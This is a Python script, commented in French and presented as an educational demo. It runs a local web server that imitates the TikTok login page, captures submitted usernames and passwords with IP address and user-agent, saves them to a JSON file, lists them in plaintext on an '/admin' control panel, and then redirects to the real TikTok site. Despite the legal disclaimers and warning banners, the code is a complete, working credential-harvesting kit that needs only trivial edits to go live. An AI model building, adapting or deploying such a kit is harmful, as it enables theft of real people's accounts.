#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║        SERVEUR DE PHISHING ÉDUCATIF - TIKTOK DEMO                ║
║                                                                  ║
║  ⚠️  AVERTISSEMENT: USAGE ÉDUCATIF UNIQUEMENT ⚠️                 ║
║                                                                  ║
║  Ce script démontre comment fonctionne une attaque phishing.    ║
║  L'utiliser contre des personnes réelles est ILLÉGAL et peut    ║
║  entraîner des poursuites pénales.                               ║
║                                                                  ║
║  Articles de loi applicables:                                    ║
║  - France: Art. 323-1 à 323-8 du Code pénal                     ║
║  - Côte d'Ivoire: Loi n°2013-451 sur la cybercriminalité        ║
╚══════════════════════════════════════════════════════════════════╝
"""

import http.server
import socketserver
import json
import os
import urllib.parse
from datetime import datetime
import socket

# Configuration
PORT = 8080
HOST = "127.0.0.1"  # Localhost uniquement pour la sécurité
LOG_FILE = "captured_credentials.json"

# Page HTML de phishing
PHISHING_PAGE = """
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok - Connexion</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
        body { background: #000; min-height: 100vh; display: flex; justify-content: center; align-items: center; }
        .container { background: #fff; padding: 40px; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.3); width: 100%; max-width: 400px; }
        .warning { background: #ff4444; color: white; padding: 10px; border-radius: 8px; margin-bottom: 20px; text-align: center; font-size: 12px; }
        .logo { text-align: center; margin-bottom: 30px; font-size: 42px; font-weight: bold; background: linear-gradient(90deg, #25F4EE, #FE2C55); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        h2 { text-align: center; margin-bottom: 25px; color: #333; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; color: #666; font-size: 14px; }
        input { width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; }
        input:focus { outline: none; border-color: #FE2C55; }
        .btn { width: 100%; padding: 14px; background: #FE2C55; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer; }
        .btn:hover { background: #e0264d; }
        .info { background: #e7f3ff; border: 1px solid #2196F3; padding: 15px; border-radius: 8px; margin-top: 20px; font-size: 13px; color: #1565C0; }
    </style>
</head>
<body>
    <div class="container">
        <div class="warning">⚠️ DÉMO ÉDUCATIVE - Serveur de phishing local</div>
        <div class="logo">TikTok</div>
        <h2>Connexion</h2>
        <form method="POST" action="/login">
            <div class="form-group">
                <label>Email ou nom d'utilisateur</label>
                <input type="text" name="username" placeholder="Email ou nom d'utilisateur" required>
            </div>
            <div class="form-group">
                <label>Mot de passe</label>
                <input type="password" name="password" placeholder="Mot de passe" required>
            </div>
            <button type="submit" class="btn">Se connecter</button>
        </form>
        <div class="info">
            <strong>🎓 Mode apprentissage:</strong><br>
            Les données seront capturées par le serveur Python et enregistrées dans un fichier JSON.
            Vérifiez le terminal pour voir les logs en temps réel.
        </div>
    </div>
</body>
</html>
"""

# Page de succès (redirection simulée)
SUCCESS_PAGE = """
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="5;url=https://www.tiktok.com">
    <title>TikTok - Vérification</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
        body { background: #000; min-height: 100vh; display: flex; justify-content: center; align-items: center; color: white; }
        .container { text-align: center; padding: 40px; }
        .loader { border: 4px solid #333; border-top: 4px solid #FE2C55; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { margin-bottom: 10px; }
        p { color: #888; }
        .captured { background: #1a1a1a; border: 2px solid #00ff00; padding: 20px; border-radius: 8px; margin-top: 30px; text-align: left; font-family: monospace; color: #00ff00; }
    </style>
</head>
<body>
    <div class="container">
        <div class="loader"></div>
        <h2>Vérification en cours...</h2>
        <p>Vous allez être redirigé vers TikTok dans 5 secondes.</p>
        
        <div class="captured">
            <strong>🚨 DONNÉES CAPTURÉES PAR LE SERVEUR:</strong><br><br>
            {captured_info}
            <br><br>
            ⚠️ Dans une vraie attaque, la victime serait redirigée vers le vrai TikTok
            sans jamais savoir que ses identifiants ont été volés!
        </div>
    </div>
</body>
</html>
"""

# Page du panneau d'administration
ADMIN_PAGE = """
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="10">
    <title>Phishing Admin Panel</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Courier New', monospace; }
        body { background: #0a0a0a; color: #00ff00; min-height: 100vh; padding: 20px; }
        h1 { color: #ff4444; margin-bottom: 20px; text-align: center; }
        .stats { display: flex; gap: 20px; margin-bottom: 30px; justify-content: center; }
        .stat-box { background: #1a1a1a; border: 1px solid #333; padding: 20px; border-radius: 8px; text-align: center; }
        .stat-number { font-size: 36px; color: #FE2C55; }
        table { width: 100%; border-collapse: collapse; background: #1a1a1a; }
        th, td { padding: 12px; text-align: left; border: 1px solid #333; }
        th { background: #FE2C55; color: white; }
        tr:hover { background: #2a2a2a; }
        .password { color: #ff6b6b; }
        .warning { background: #ff4444; color: white; padding: 15px; border-radius: 8px; margin-bottom: 20px; text-align: center; }
    </style>
</head>
<body>
    <div class="warning">⚠️ PANNEAU D'ADMINISTRATION - DÉMO ÉDUCATIVE UNIQUEMENT ⚠️</div>
    <h1>🎣 Phishing Control Panel</h1>
    
    <div class="stats">
        <div class="stat-box">
            <div class="stat-number">{total_captures}</div>
            <div>Identifiants capturés</div>
        </div>
        <div class="stat-box">
            <div class="stat-number">{unique_users}</div>
            <div>Utilisateurs uniques</div>
        </div>
    </div>
    
    <table>
        <thead>
            <tr>
                <th>#</th>
                <th>Timestamp</th>
                <th>IP Address</th>
                <th>Username/Email</th>
                <th>Password</th>
                <th>User-Agent</th>
            </tr>
        </thead>
        <tbody>
            {table_rows}
        </tbody>
    </table>
    
    <p style="margin-top: 20px; color: #666;">
        Page auto-refresh toutes les 10 secondes | 
        <a href="/" style="color: #25F4EE;">Voir la page de phishing</a>
    </p>
</body>
</html>
"""

class PhishingHandler(http.server.SimpleHTTPRequestHandler):
    """Gestionnaire HTTP pour le serveur de phishing"""
    
    def log_message(self, format, *args):
        """Log personnalisé"""
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {args[0]}")
    
    def do_GET(self):
        """Gérer les requêtes GET"""
        client_ip = self.client_address[0]
        
        if self.path == "/" or self.path == "/login":
            # Page de phishing principale
            self.send_response(200)
            self.send_header("Content-type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(PHISHING_PAGE.encode('utf-8'))
            print(f"\n{'='*60}")
            print(f"🎯 NOUVELLE VICTIME POTENTIELLE!")
            print(f"   IP: {client_ip}")
            print(f"   User-Agent: {self.headers.get('User-Agent', 'Unknown')[:50]}...")
            print(f"{'='*60}\n")
            
        elif self.path == "/admin":
            # Panneau d'administration
            self.send_admin_page()
            
        else:
            self.send_error(404, "Page non trouvée")
    
    def do_POST(self):
        """Gérer les requêtes POST (capture des identifiants)"""
        if self.path == "/login":
            # Lire les données POST
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            
            # Parser les données
            parsed_data = urllib.parse.parse_qs(post_data)
            username = parsed_data.get('username', [''])[0]
            password = parsed_data.get('password', [''])[0]
            
            # Informations supplémentaires
            client_ip = self.client_address[0]
            user_agent = self.headers.get('User-Agent', 'Unknown')
            timestamp = datetime.now().isoformat()
            
            # Créer l'entrée de log
            credential_entry = {
                "timestamp": timestamp,
                "ip_address": client_ip,
                "username": username,
                "password": password,
                "user_agent": user_agent
            }
            
            # Sauvegarder dans le fichier JSON
            self.save_credentials(credential_entry)
            
            # Afficher dans le terminal
            print("\n" + "🚨" * 30)
            print("🎣 IDENTIFIANTS CAPTURÉS!")
            print("🚨" * 30)
            print(f"""
╔══════════════════════════════════════════════════════════════╗
║  NOUVELLE CAPTURE - {timestamp}
╠══════════════════════════════════════════════════════════════╣
║  📍 IP Address  : {client_ip}
║  👤 Username    : {username}
║  🔑 Password    : {password}
║  🌐 User-Agent  : {user_agent[:50]}...
╚══════════════════════════════════════════════════════════════╝
            """)
            print("🚨" * 30 + "\n")
            
            # Envoyer la page de succès
            captured_info = f"""
IP: {client_ip}<br>
Username: {username}<br>
Password: {'*' * len(password)} (masqué pour la démo)<br>
Timestamp: {timestamp}
            """
            
            self.send_response(200)
            self.send_header("Content-type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(SUCCESS_PAGE.format(captured_info=captured_info).encode('utf-8'))
        else:
            self.send_error(404)
    
    def save_credentials(self, entry):
        """Sauvegarder les identifiants dans un fichier JSON"""
        credentials = []
        
        # Charger les données existantes
        if os.path.exists(LOG_FILE):
            try:
                with open(LOG_FILE, 'r', encoding='utf-8') as f:
                    credentials = json.load(f)
            except:
                credentials = []
        
        # Ajouter la nouvelle entrée
        credentials.append(entry)
        
        # Sauvegarder
        with open(LOG_FILE, 'w', encoding='utf-8') as f:
            json.dump(credentials, f, indent=2, ensure_ascii=False)
    
    def send_admin_page(self):
        """Générer et envoyer la page d'administration"""
        credentials = []
        
        if os.path.exists(LOG_FILE):
            try:
                with open(LOG_FILE, 'r', encoding='utf-8') as f:
                    credentials = json.load(f)
            except:
                credentials = []
        
        # Générer les lignes du tableau
        table_rows = ""
        for i, cred in enumerate(credentials, 1):
            table_rows += f"""
            <tr>
                <td>{i}</td>
                <td>{cred.get('timestamp', 'N/A')}</td>
                <td>{cred.get('ip_address', 'N/A')}</td>
                <td>{cred.get('username', 'N/A')}</td>
                <td class="password">{cred.get('password', 'N/A')}</td>
                <td>{cred.get('user_agent', 'N/A')[:30]}...</td>
            </tr>
            """
        
        if not table_rows:
            table_rows = '<tr><td colspan="6" style="text-align:center;">Aucune capture encore...</td></tr>'
        
        # Calculer les stats
        unique_users = len(set(c.get('username', '') for c in credentials))
        
        # Envoyer la page
        self.send_response(200)
        self.send_header("Content-type", "text/html; charset=utf-8")
        self.end_headers()
        
        html = ADMIN_PAGE.format(
            total_captures=len(credentials),
            unique_users=unique_users,
            table_rows=table_rows
        )
        self.wfile.write(html.encode('utf-8'))


def get_local_ip():
    """Obtenir l'IP locale"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"


def main():
    """Fonction principale"""
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    
    print("""
╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║   🎣 SERVEUR DE PHISHING ÉDUCATIF - TIKTOK                      ║
║                                                                  ║
║   ⚠️  AVERTISSEMENT LÉGAL ⚠️                                     ║
║   Ce serveur est UNIQUEMENT pour l'apprentissage.               ║
║   L'utiliser contre des personnes réelles est un CRIME.          ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝
    """)
    
    local_ip = get_local_ip()
    
    print(f"""
📡 SERVEUR DÉMARRÉ!
═══════════════════════════════════════════════════════════════════

   🌐 Page de phishing : http://{HOST}:{PORT}/
   🔧 Panel admin      : http://{HOST}:{PORT}/admin
   
   📱 Pour tester depuis votre téléphone (même réseau WiFi):
      http://{local_ip}:{PORT}/
   
═══════════════════════════════════════════════════════════════════

📋 INSTRUCTIONS:
   1. Ouvrez http://localhost:{PORT}/ dans votre navigateur
   2. Entrez de faux identifiants
   3. Observez les données capturées dans ce terminal
   4. Visitez /admin pour voir le panneau de contrôle

   Appuyez sur Ctrl+C pour arrêter le serveur.

═══════════════════════════════════════════════════════════════════
🎯 En attente de victimes...
    """)
    
    # Démarrer le serveur
    with socketserver.TCPServer((HOST, PORT), PhishingHandler) as httpd:
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n\n🛑 Serveur arrêté.")
            print(f"📁 Identifiants capturés sauvegardés dans: {LOG_FILE}")


if __name__ == "__main__":
    main()
